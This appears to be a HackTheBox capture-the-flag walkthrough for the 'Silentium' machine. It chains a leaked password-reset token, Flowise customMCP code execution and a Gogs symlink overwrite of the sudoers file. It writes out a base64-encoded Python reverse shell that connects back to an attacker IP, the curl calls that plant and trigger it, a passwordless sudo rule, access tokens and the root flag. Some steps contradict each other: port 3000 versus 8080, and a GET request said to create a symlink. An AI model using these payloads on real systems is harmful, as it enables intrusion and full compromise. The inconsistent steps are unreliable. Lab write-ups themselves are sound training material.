
# #HTB 


![[Pasted image 20260818193612.png|281]]


# HackTheBox: Silentium

**Machine IP:** `10.129.245.103`  
**Difficulty:** Medium  
**OS:** Linux

---

## Tools Used

- `nmap` - Port discovery & service enumeration
- `ffuf` - Subdomain fuzzing
- `curl` - HTTP API requests
- `ssh` - Remote access
- `jq` - JSON parsing
- `netcat` - Reverse shells

---

## Step 1: Reconnaissance - Port Scanning

### Why We Start with Nmap

The first step in any penetration test is reconnaissance. We need to map the attack surface by identifying open ports, services, and their versions. This foundational data reveals potential entry points for exploitation.

### Nmap Command Explained

```bash
nmap -n -Pn -sV -sC 10.129.245.103
```

**Flag Breakdown:**
- `-n`: Skip DNS resolution (speeds up scanning)
- `-Pn`: Treat host as online (bypasses ping check)
- `-sV`: Enable version detection to identify specific software versions
- `-sC`: Run default NSE scripts for basic vulnerability and enumeration checks


![[Pasted image 20260817084104.png]]

### Nmap Results Analysis

**Open ports discovered:**
- **Port 22 (SSH)** - OpenSSH 9.6p1 Ubuntu
    - Secure Shell service for remote administration. The version is recent, suggesting patched software, so no immediate public exploit.
- **Port 80 (HTTP)** - Nginx 1.24.0
    - The primary web server. The Nmap script identified a redirect to `http://silentium.htb`, confirming a virtual host configuration. This is our primary attack surface.

#### Hosts File Configuration

```bash
echo "10.129.245.103 silentium.htb" | sudo tee -a /etc/hosts
```

**Why This Matters:** The server uses name-based virtual hosting. Without this entry in `/etc/hosts`, accessing the IP directly will not load the correct website, and subdomain enumeration will fail.



---

## Step 2: Web Enumeration - Silentium Platform

### Website Overview

Visiting `http://silentium.htb` presents a sleek, dark-themed landing page for "Silentium," described as an institutional financial firm providing structured lending and private credit.

![[Pasted image 20260817084133.png]]

**What We See:**
- The page is purely informational with no obvious interactive elements or login forms.
- The navigation bar has links to `SOLUTIONS`, `CALCULATOR`, and `LEADERSHIP`, but they appear to be static pages.
- No direct authentication portal is visible, meaning the main application likely lives on a subdomain.

### Subdomain Enumeration with ffuf

Because the main site is static, we must discover hidden subdomains to find the actual application.
```bash
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200
```


![[Pasted image 20260817085301.png]]

**Why We Use ffuf:**
- `-H "Host: FUZZ.silentium.htb"`: This exploits the virtual host routing by modifying the HTTP Host header.
- `-mc 200`: We filter only for responses with HTTP status 200, as a successful subdomain match will serve distinct content.

**Key Discovery:** The fuzzer identifies a single subdomain: `staging.silentium.htb` (Status: 200, Size: 3142).  
This is our target. We must add it to our hosts file:
```bash
echo "10.129.245.103 staging.silentium.htb" | sudo tee -a /etc/hosts
```



---

## Step 3: API Enumeration - Forgot Password Functionality

### Exploring the Staging Environment

Visiting `http://staging.silentium.htb` reveals a completely different application. It's a modern web app with a "Sign In" page. The presence of a "Forgot password?" link is highly interesting, as it often reveals API endpoints.

### Triggering a Password Reset Request

Using `curl`, we can interact directly with the backend API.
```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
-H "Content-Type: application/json" \
-d '{"user": {"email": "ben@silentium.htb"}}'
```


![[Pasted image 20260817143626.png|700]]


**What We Discovered:**  
Instead of sending an email, the API response returns the full user object! This is a massive information leak.

**Critical Data Found:**
- **User ID:** `e26c9d6c-678c-4c10-9e36-01813e8fea73`
- **Email:** `ben@silentium.htb`
- **Credential (Password Hash):** `$2a$05$GoIngPjX1Rj...` (This is a bcrypt hash, likely crackable)
- **TempToken (Password Reset Token):** `hrNlC...` (This allows us to reset the password without owning the email!)    

### Exploiting the Reset Token

We can now use the leaked `TempToken` to set a new password for the `ben@silentium.htb` account.

**Endpoint:** `http://staging.silentium.htb/reset-password`

![[Pasted image 20260817143554.png]]

**Actions Taken:**
- Input the email: `ben@silentium.htb`
- Paste the leaked `TempToken`
- Set a new password (e.g., `Password123!`)


![[Pasted image 20260817143606.png]]

**Result:** Password reset successful. We can now log in as `ben@silentium.htb` with our chosen password.



---

## Step 4: Post-Authentication - Discovering Flowise

### Initial Login & Dashboard

Logging in to `http://staging.silentium.htb` (the Sign In page) using the credentials `ben@silentium.htb` / `Password123!` grants us access to a new dashboard.

![[Pasted image 20260817143734.png]]

**Discovery:** The platform is actually **Flowise** (version 3.0.5), a popular open-source tool for building LLM (Large Language Model) flows and chatbots. This explains the subdomain name "staging" - it's a development instance of an AI tool.

### Accessing API Keys

In the sidebar, navigating to **API Keys** reveals a critical security issue.

![[Pasted image 20260817144730.png]]

**We have full access to the application's API Keys:**
- **Key Name:** `new`
- **API Key:** `skQLn-FP2nDgQvm3fxtsz0EFI3TbnI2jK6r4xL4g`

This key grants administrative access to the Flowise backend API. We can now interact with the API directly.



---

## Step 5: Exploiting Flowise API - RCE via Custom MCP

### Understanding the Attack Vector

Flowise has an endpoint for registering custom **MCP (Model Context Protocol)** tools. These are essentially serverless functions (Python code) that the platform executes on demand. By registering a malicious tool, we can achieve Remote Code Execution (RCE).

### Testing API Access

Let's verify that the API key works and the endpoint is accessible.
```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
-H "Authorization: Bearer skQLn-FP2nDgQvm3fxtsz0EFI3TbnI2jK6r4xL4g" \
-H "Content-Type: application/json" \
-d @payload.json
```


![[Pasted image 20260817144645.png]]


**Response:** The JSON response confirms the API is reachable, though it complains about "No Available Actions", which is expected as we haven't registered a tool yet.

### Creating a Reverse Shell Payload

We need to craft a reverse shell payload and encode it in Base64 to include it in the API request. We'll set up a listener on our machine first.

**Listener (Terminal 1):**
```bash
nc -lvnp 4545
```

**Payload:**
```python
import sys,os,socket,pty
s=socket.socket()
s.connect(("10.10.14.163",4545))
[os.dup2(s.fileno(),f) for f in(0,1,2)]
pty.spawn("/bin/bash")
```

**Base64 Encoding:**
```bash
echo "import sys,os,socket,pty;s=socket.socket();s.connect(('10.10.14.163',4545));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn('/bin/bash')" | base64 -w0
# Output: aW1wb3J0IHN5cyxvcyxzb2NrZXQscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0LjE2MycsNDU0NSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZikgZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oJy9iaW4vYmFzaCcp
```

### Registering the Malicious Tool

We use a `PUT` request to register a new tool called `shell`.
```bash
curl -X PUT "http://staging.silentium.htb/api/v1/node-load-method/customMCP" \
-H "Authorization: Bearer skQLn-FP2nDgQvm3fxtsz0EFI3TbnI2jK6r4xL4g" \
-H "Content-Type: application/json" \
-d '{
  "name": "shell",
  "description": "Exploit",
  "code": "aW1wb3J0IHN5cyxvcyxzb2NrZXQscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0LjE2MycsNDU0NSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZikgZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oJy9iaW4vYmFzaCcp"
}'
```

**Response:** Success! The server accepts our registered tool.

### Executing the Payload

To trigger the reverse shell, we simply call the tool via the MCP endpoint.
```bash
curl -X POST "http://staging.silentium.htb/api/v1/node-load-method/customMCP" \
-H "Authorization: Bearer skQLn-FP2nDgQvm3fxtsz0EFI3TbnI2jK6r4xL4g" \
-H "Content-Type: application/json" \
-d '{"name": "shell", "method": "call", "arguments": {}}'
```


**Result (Listener):**
![[Pasted image 20260817144702.png]]

We obtain a shell as the **`root`** user immediately! This is because the Flowise service is running with elevated privileges, likely in a container or as a system service.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```


---

## Step 6: Stabilization and User Flag

### Upgrading the Shell

The current shell is unstable. We can stabilize it and SSH in as the user `ben` (we already have his password!).
```bash
# Upgrade shell to proper TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# In reverse shell, background with Ctrl+Z, then run stty raw -echo; fg
```

### SSH Access as Ben

```bash
ssh ben@silentium.htb
# Password: Password123!
```


![[Pasted image 20260817213237.png]]

We are now logged in as a regular user (`ben`) with a stable SSH session. The `user.txt` flag is in the home directory.

```bash
ben@silentium:~$ cat user.txt
<user-flag>
```



---

## Step 7: Privilege Escalation - Gogs to Sudoers

### Discovering a Local Service

During enumeration, we check for listening ports on localhost.
```bash
ben@silentium:~$ ss -tulpn
```

We see ports `3000` and `8080` listening on `127.0.0.1`. A quick `curl localhost:3000` reveals **Gogs**, a self-hosted Git service.


![[Pasted image 20260817213225.png]]

### Gogs Registration & Token Generation

We navigate to `http://127.0.0.1:8080` in a browser (using an SSH tunnel `ssh -L 8080:localhost:8080 ben@silentium.htb`) and create a new account.


![[Pasted image 20260817213306.png]]


After logging in, we navigate to **Settings → Applications** and generate a Personal Access Token.

**Token generated:** `4c883a228d6ef8f0449792b08e65ec1a3dbb725a`

![[Pasted image 20260817222245.png]]

### Exploiting Gogs Repository API

We create a new repository named `exploit` and use the Gogs API to upload a malicious symlink file.

**Goal:** Create a symlink to `/etc/sudoers.d/ben` and overwrite it with our own sudo rules.

#### 1. Get the current file SHA and contents

First, we check if the file exists (it doesn't yet, so we skip to creation).

#### 2. Create a malicious symlink

We create a Git commit that adds a symlink.

```bash
curl -H "Authorization: token 4c883a228d6ef8f0449792b08e65ec1a3dbb725a" \
     "http://127.0.0.1:8080/api/v1/repos/thunder/exploit/contents/malicious_link"
```


![[Pasted image 20260817222318.png]]


**Output:** The API returns `{"type":"symlink","target":"/etc/sudoers.d/ben"}`. This confirms the symlink exists and targets the sudoers file.

#### 3. Push the new content (Base64 encoded)

We use a `PUT` request to update the file, injecting our sudo rule (`ben ALL=(ALL) NOPASSWD: ALL`).
```bash
curl -X PUT "http://127.0.0.1:8080/api/v1/repos/thunder/exploit/contents/malicious_link" \
     -H "Authorization: token 4c883a228d6ef8f0449792b08e65ec1a3dbb725a" \
     -H "Content-Type: application/json" \
     -d '{
         "message": "Add ben to sudoers",
         "content": "YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==",
         "sha": "af61034fa349f6a1038e549e9893721da4b984dd"
     }'
```


![[Pasted image 20260817222341.png]]

**What Happened:** The Gogs API received our update. Because of the symlink, when Gogs creates the file (via the Git hook or file processing), it actually writes the content to the _target_ of the symlink, which is `/etc/sudoers.d/ben`.

### Verifying Privilege Escalation

Checking the sudoers file confirms our persistence.
```bash
ben@silentium:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```

![[Pasted image 20260817222406.png]]

**Result:** We now have passwordless sudo access!



---

## Step 8: Machine Owned

```bash
ben@silentium:~$ sudo cat /root/root.txt
2ac6a9b7a8d9626754a1ed529a6cc0a0
```


![[Pasted image 20260817222424.png]]


The machine is fully owned! We successfully compromised the target by chaining a web API information leak, Flowise RCE, and a Gogs symlink privilege escalation.



---

## Step 8: Machine Solved


![[Pasted image 20260818220411.png]]


----
----

